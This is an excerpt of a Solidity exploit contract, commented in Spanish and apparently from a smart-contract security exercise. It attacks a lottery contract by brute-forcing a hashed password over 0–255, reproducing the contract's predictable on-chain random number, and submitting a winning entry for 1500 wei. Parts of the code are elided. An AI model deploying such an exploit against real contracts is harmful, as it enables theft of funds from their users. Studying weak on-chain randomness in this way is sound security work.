...
contract AttackerLoteria {
    ...
    function attack(address _sc) public payable {
        ...
        uint8 passw;
        for (uint8 i ; i < 256 ; i++) {
            if (uint256(keccak256(abi.encodePacked(i))) == FACTOR) {
                passw = i;
                break;
            }
        }

        // Replicar el método de número random
        uint256 numRandom = uint256(
            keccak256(
                abi.encodePacked(
                    FACTOR,
        ...
        // llamar a lotería pasándole 1500 wei
        loteria.participarEnLoteria{value: 1500}(passw, numeroGanador);
    }
